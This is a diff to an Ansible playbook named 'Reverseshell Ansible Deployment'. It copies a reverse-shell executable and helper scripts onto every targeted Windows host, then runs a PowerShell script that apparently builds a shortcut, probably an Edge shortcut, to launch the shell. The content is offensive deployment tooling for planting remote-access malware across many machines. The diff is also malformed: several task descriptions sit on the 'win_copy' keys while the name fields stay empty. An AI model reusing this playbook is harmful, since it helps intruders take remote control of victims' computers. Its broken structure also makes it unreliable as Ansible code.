@@ -1,22 +1,22 @@
 ---
-- name:
+- name: Reverseshell Ansible Deployment
   hosts: all
   tasks:
     - name:
-      win_copy:
+      win_copy: Copy ReverseShell Executable
         src: ./files/reverseshell.exe
         dest: C:\run.exe
 
     - name:
-      win_copy:
+      win_copy: Copy PowerShell Shortcut Creation Script
         src: ./files/ps.ps1
         dest: C:\ps.ps1
 
     - name:
-      win_copy:
+      win_copy: Copy Reverseshell Edge Script
         src: ./files/sc.bat
         dest: C:\sc.bat
 
-    - name:
+    - name: Generate Shortcut via Script
       win_command: powershell.exe C:/ps.ps1
 ...
